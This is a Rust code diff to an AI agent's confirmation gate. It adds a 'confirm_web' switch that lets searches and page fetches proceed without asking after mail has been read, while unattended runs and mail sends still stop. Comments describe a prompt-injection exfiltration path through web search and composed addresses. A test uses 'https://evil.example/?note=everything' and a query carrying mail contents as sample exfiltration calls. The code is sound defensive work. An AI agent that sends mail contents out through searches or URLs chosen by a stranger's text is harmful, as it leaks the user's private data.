@@ -519,6 +519,12 @@ struct ConfirmGate {
     /// is still installed, because the events it emits are also how the panel
     /// draws what ran.
     enabled: bool,
+    /// Whether a search or a page open that could carry something out stops
+    /// and asks. The person's [`AgentSettings::confirm_web`] while they are
+    /// in the conversation, and always on for a turn with nobody watching:
+    /// that switch means "don't ask me while I am here". See where the gate
+    /// is built.
+    confirm_web: bool,
     /// Whether there is anybody to ask.
     ///
     /// A scheduled run has nobody, so with `enabled` set the answer is a
@@ -626,20 +632,22 @@ struct Ran {
 /// this is the one decision actually worth a test of its own -- in
 /// particular, that `web_search` is left alone right up until
 /// `tainted_search` says a mail `Read` tool has already returned content
-/// this turn, and is never left alone again once it has.
+/// this turn, and is never left alone again once it has -- unless
+/// `confirm_web` is off, which is the person saying those may go ahead.
 fn must_confirm(
     effect: Option<Effect>,
     enabled: bool,
     tainted_search: bool,
+    confirm_web: bool,
 ) -> Option<&'static str> {
     match effect {
-        // A destructive call is gated on the person's own setting; the
-        // other two are not, because neither has a setting that turns them
-        // off -- see `Effect::Outward`'s own docs and the module doc's "the
-        // exfiltration path through `web_search`".
+        // A destructive call is gated on the person's own setting, and an
+        // outward one is not: there is no setting that sends mail without
+        // asking. A search after mail has been read is gated on
+        // `confirm_web` -- see `AgentSettings::confirm_web`.
         Some(Effect::Destructive) if enabled => Some("destructive"),
         Some(Effect::Outward) => Some("outward"),
-        _ if tainted_search => Some("search"),
+        _ if tainted_search && confirm_web => Some("search"),
         _ => None,
     }
 }
@@ -664,10 +672,15 @@ fn must_confirm(
 /// writing in the context, and from then on a model choosing *which* of
 /// several known addresses to visit is a choice a stranger may have made.
 ///
-/// Something that is not an address [`webpage::read`] would fetch at all
-/// is not asked about: nothing would leave the machine, and the tool's own
-/// refusal says why.
-fn must_confirm_fetch(trust: Trust, tainted: bool) -> Option<&'static str> {
+/// `confirm_web` off is the person saying not to ask, while they are in
+/// the conversation. The gate for an unattended turn is built with it still
+/// on. Something that is not an address [`webpage::read`] would fetch at
+/// all is not asked about either way: nothing would leave the machine, and
+/// the tool's own refusal says why.
+fn must_confirm_fetch(trust: Trust, tainted: bool, confirm_web: bool) -> Option<&'static str> {
+    if !confirm_web {
+        return None;
+    }
     match trust {
         Trust::NotAnAddress => None,
         _ if tainted => Some("fetch"),
@@ -1155,9 +1168,12 @@ impl ConfirmGate {
         // deliberately. The model is told plainly that it was not done
         // and why, so it can say so in its report rather than trying
         // again. Somebody who wants a routine to delete things turns the
-        // confirmation off, having read the sentence beside the switch
-        // -- `outward`, `search` and `fetch` have no such switch and are
-        // refused unattended regardless.
+        // confirmation off, having read the sentence beside the switch.
+        // `outward` has no such switch. `search` and `fetch` do
+        // ([`AgentSettings::confirm_web`](everyday_core::agent::AgentSettings::confirm_web)),
+        // but an unattended turn is built with that gate still on: the
+        // switch is about a person who is watching, and a routine or a job
+        // is refused here regardless.
         (self.channel)(AgentEvent::ToolFinished {
             call_id,
             name,
@@ -1179,6 +1195,7 @@ impl ConfirmGate {
         // by a second hook. See the module doc's "the exfiltration path
         // through `web_search`", and `must_confirm_fetch` for the page.
         let mail_read = self.mail_read_this_turn.load(Ordering::Acquire);
+        let confirm_web = self.confirm_web;
         // Following a feed is a fetch with a delay: the refresher will ask
         // that address for news within a minute, so an address the model
         // composed -- or any address once a stranger's words are in the
@@ -1208,19 +1225,21 @@ impl ConfirmGate {
         if name == READ_WEB_PAGE {
             let address = arguments.get("url").and_then(|v| v.as_str()).unwrap_or_default();
             let trust = self.provenance.lock().unwrap().check(address);
-            must_confirm_fetch(trust, mail_read)
+            must_confirm_fetch(trust, mail_read, confirm_web)
         } else if let Some(address) = looked_up_address {
             let trust = self.provenance.lock().unwrap().check(address.trim());
-            must_confirm_fetch(trust, mail_read)
+            must_confirm_fetch(trust, mail_read, confirm_web)
         } else if follows_address {
             let address = arguments.get("url").and_then(|v| v.as_str()).unwrap_or_default();
             let trust = self.provenance.lock().unwrap().check(address);
-            must_confirm_fetch(trust, mail_read)
-                .or_else(|| must_confirm(self.effect_of(name, arguments), self.enabled, false))
+            must_confirm_fetch(trust, mail_read, confirm_web).or_else(|| {
+                must_confirm(self.effect_of(name, arguments), self.enabled, false, confirm_web)
+            })
         } else if let Some(address) = cover_address {
             let trust = self.provenance.lock().unwrap().check(address);
-            must_confirm_fetch(trust, mail_read)
-                .or_else(|| must_confirm(self.effect_of(name, arguments), self.enabled, false))
+            must_confirm_fetch(trust, mail_read, confirm_web).or_else(|| {
+                must_confirm(self.effect_of(name, arguments), self.enabled, false, confirm_web)
+            })
         } else {
             // `look_up_item` sends its title to a catalogue the way
             // `web_search` sends its query to a search engine, so a title
@@ -1228,7 +1247,7 @@ impl ConfirmGate {
             // searches for a picture, a place and a route: every word of
             // each leaves the machine.
             let tainted_search = SENDS_WORDS.contains(&name) && mail_read;
-            must_confirm(self.effect_of(name, arguments), self.enabled, tainted_search)
+            must_confirm(self.effect_of(name, arguments), self.enabled, tainted_search, confirm_web)
         }
     }
 
@@ -3160,6 +3179,9 @@ pub async fn run_turn(turn: Turn) -> CommandResult<Turned> {
             via.is_some() || reach.asker.is_some(),
             job.is_some(),
         ),
+        // The switch is "don't ask me while I am here". A scheduled run and
+        // a job have nobody there, so they still stop, whatever it says.
+        confirm_web: settings.confirm_web || nobody_watching,
         unattended: nobody_watching,
         job: job.is_some(),
         research: job.as_ref().map(|job| ResearchReading {
@@ -3803,39 +3825,49 @@ mod tests {
 
     #[test]
     fn a_destructive_call_is_gated_on_the_setting_and_outward_never_is() {
-        assert_eq!(must_confirm(Some(Effect::Destructive), true, false), Some("destructive"));
+        assert_eq!(must_confirm(Some(Effect::Destructive), true, false, true), Some("destructive"));
         assert_eq!(
-            must_confirm(Some(Effect::Destructive), false, false),
+            must_confirm(Some(Effect::Destructive), false, false, true),
             None,
             "confirm_destructive is off"
         );
-        assert_eq!(must_confirm(Some(Effect::Outward), false, false), Some("outward"));
+        assert_eq!(must_confirm(Some(Effect::Outward), false, false, true), Some("outward"));
         assert_eq!(
-            must_confirm(Some(Effect::Outward), true, false),
+            must_confirm(Some(Effect::Outward), true, false, false),
             Some("outward"),
-            "outward is confirmed unconditionally -- there is no setting that turns it off"
+            "outward is confirmed unconditionally -- confirm_web does not send mail"
         );
     }
 
     /// The exfiltration path through `web_search`: an ordinary search call
     /// (`effect: None`, since it is not in the core catalogue) runs freely
     /// until a mail `Read` tool has returned content this turn, and stops
-    /// to ask every time after that.
+    /// to ask every time after that, unless the person has turned that card off.
     #[test]
     fn web_search_only_needs_confirming_once_mail_has_been_read_this_turn() {
-        assert_eq!(must_confirm(None, true, false), None, "mail untouched this turn");
-        assert_eq!(must_confirm(None, true, true), Some("search"));
+        assert_eq!(must_confirm(None, true, false, true), None, "mail untouched this turn");
+        assert_eq!(must_confirm(None, true, true, true), Some("search"));
         assert_eq!(
-            must_confirm(None, false, true),
+            must_confirm(None, false, true, true),
             Some("search"),
             "confirm_destructive is unrelated"
+        );
+        assert_eq!(
+            must_confirm(None, true, true, false),
+            None,
+            "confirm_web off lets a tainted search go ahead"
+        );
+        assert_eq!(
+            must_confirm(Some(Effect::Destructive), true, true, false),
+            Some("destructive"),
+            "the web switch does not cover a delete"
         );
     }
 
     #[test]
     fn an_ordinary_read_or_write_is_never_gated() {
-        assert_eq!(must_confirm(Some(Effect::Write), true, false), None);
-        assert_eq!(must_confirm(Some(Effect::Read), true, false), None);
+        assert_eq!(must_confirm(Some(Effect::Write), true, false, true), None);
+        assert_eq!(must_confirm(Some(Effect::Read), true, false, true), None);
     }
 
     // ---- chat turns --------------------------------------------------------
@@ -3864,7 +3896,8 @@ mod tests {
             must_confirm(
                 Some(Effect::Destructive),
                 confirms_destructive(false, true, false),
-                false
+                false,
+                true
             ),
             Some("destructive")
         );
@@ -3927,7 +3960,8 @@ mod tests {
             must_confirm(
                 Some(Effect::Destructive),
                 confirms_destructive(false, false, true),
-                false
+                false,
+                true
             ),
             Some("destructive")
         );
@@ -3940,15 +3974,44 @@ mod tests {
     /// been read every address asks.
     #[test]
     fn a_page_is_read_unasked_only_from_a_known_address_and_before_mail() {
-        assert_eq!(must_confirm_fetch(Trust::Seen, false), None);
-        assert_eq!(must_confirm_fetch(Trust::Unseen, false), Some("fetch"));
-        assert_eq!(must_confirm_fetch(Trust::Seen, true), Some("fetch"), "mail was read");
-        assert_eq!(must_confirm_fetch(Trust::Unseen, true), Some("fetch"));
+        assert_eq!(must_confirm_fetch(Trust::Seen, false, true), None);
+        assert_eq!(must_confirm_fetch(Trust::Unseen, false, true), Some("fetch"));
+        assert_eq!(must_confirm_fetch(Trust::Seen, true, true), Some("fetch"), "mail was read");
+        assert_eq!(must_confirm_fetch(Trust::Unseen, true, true), Some("fetch"));
         assert_eq!(
-            must_confirm_fetch(Trust::NotAnAddress, true),
+            must_confirm_fetch(Trust::NotAnAddress, true, true),
             None,
             "nothing would be sent, and the tool refuses it itself"
         );
+        assert_eq!(
+            must_confirm_fetch(Trust::Unseen, true, false),
+            None,
+            "confirm_web off lets an address the model composed go ahead"
+        );
+    }
+
+    /// The switch is read by the gate, not only by the pure functions: a
+    /// tainted search and a page the model composed both run, and a send
+    /// still stops.
+    #[test]
+    fn confirm_web_off_lets_a_search_and_a_page_through_and_still_asks_to_send() {
+        let (vault, _dir) = test_vault();
+        let gate = test_gate(vault, ConversationId::new());
+        gate.mail_read_this_turn.store(true, Ordering::Release);
+        let mut open = gate;
+        open.confirm_web = false;
+
+        let query = serde_json::json!({ "query": "the quarterly numbers from the mail" });
+        assert_eq!(open.confirmation(WEB_SEARCH, &query), None);
+        let page = serde_json::json!({ "url": "https://evil.example/?note=everything" });
+        assert_eq!(open.confirmation(READ_WEB_PAGE, &page), None);
+        assert_eq!(open.confirmation("send_draft", &serde_json::json!({})), Some("outward"));
+
+        // And the same calls still ask when the switch is on.
+        let asking = test_gate(open.vault.clone(), open.conversation);
+        asking.mail_read_this_turn.store(true, Ordering::Release);
+        assert_eq!(asking.confirmation(WEB_SEARCH, &query), Some("search"));
+        assert_eq!(asking.confirmation(READ_WEB_PAGE, &page), Some("fetch"));
     }
 
     #[test]
@@ -4643,6 +4706,7 @@ mod tests {
             issued: Arc::default(),
             channel: Arc::new(|_| {}),
             enabled: true,
+            confirm_web: true,
             unattended: false,
             job: false,
             research: None,
